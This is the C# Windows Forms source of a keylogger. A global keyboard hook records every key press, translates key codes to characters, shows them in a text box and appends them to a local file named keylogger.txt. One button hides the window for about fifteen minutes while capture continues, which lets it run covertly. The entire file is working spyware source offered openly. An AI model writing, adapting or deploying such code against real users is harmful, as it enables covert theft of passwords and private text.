using System;
using System.IO;
using System.Windows.Forms;
using WikiReader;

namespace KeyLogger
{
    public partial class Form1 : Form
    {

        int seconds;
        bool record = false;
        UserActivityHook hook;
        string log = string.Empty;
        string key = string.Empty;
        public Form1()
        {
            InitializeComponent();
            button2.Enabled = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        public string filter_Key(string key)
        {
            switch(key)
            {
                case "Space":
                    {
                        return " ";
                    }
                case "RShiftKey":
                case "LShiftKey":
                    {
                        return " [shift] ";
                    }
                case "Return":
                    {
                        return "\n";
                    }
                case "RControlKey":
                case "LControlKey":
                    {
                        return " [ctrl] ";
                    }
                case "Escape":
                    {
                        return " [ESC] ";
                    }
                case "Tab":
                    {
                        return "\n";
                    }
                case "Oemcomma":
                    {
                        return ",";
                    }
                case "Decimal":
                case "OemPeriod":
                    {
                        return ".";
                    }
                case "NumPad0":
                case "D0":
                    {
                        return "0";
                    }
                case "NumPad1":
                case "D1":
                    {
                        return "1";
                    }
                case "NumPad2":
                case "D2":
                    {
                        return "2";
                    }
                case "NumPad3":
                case "D3":
                    {
                        return "3";
                    }
                case "NumPad4":
                case "D4":
                    {
                        return "4";
                    }
                case "NumPad5":
                case "D5":
                    {
                        return "5";
                    }
                case "NumPad6":
                case "D6":
                    {
                        return "6";
                    }
                case "NumPad7":
                case "D7":
                    {
                        return "7";
                    }
                case "NumPad8":
                case "D8":
                    {
                        return "8";
                    }
                case "NumPad9":
                case "D9":
                    {
                        return "9";
                    }
                case "Add":
                    {
                        return "+";
                    }
                case "Oemplus":
                    {
                        return "=";
                    }
                case "OemMinus":
                case "Subtract":
                    {
                        return "-";
                    }
                case "Multiply":
                    {
                        return "*";
                    }
                case "Divide":
                    {
                        return "/";
                    }
                case "Back":
                    {
                        return " [backspace] ";
                    }
                case "Oem1":
                    {
                        return ";";
                    }
                case "Oem5":
                    {
                        return "\\";
                    }
                case "Oem7":
                    {
                        return "'";
                    }
                case "OemQuestion":
                    {
                        return "/";
                    }
                default:
                    {
                        return key;
                    }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (record == false)
            {
                record = true;
                start_Recording();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (record == true)
            {
                record = false;
                stop_Recording();
            }
        }

        public void start_Recording()
        {
            hook = new UserActivityHook();
                hook.KeyUp += (s, e) =>
                {
                    key = e.KeyData.ToString();
                    log = filter_Key(key);
                    richTextBox1.Text += log;
                    System.IO.File.AppendAllText(@"keylogger.txt", log);
                };
            button1.Enabled = false;
            button2.Enabled = true;
        }

        public void stop_Recording()
        {
            hook.Stop();
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.Hide();
            timer1.Start();
            seconds = 0;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            seconds++;
            if(seconds >= 900)
            {
                this.Show();
                timer1.Stop();
            }
        }
    }
}
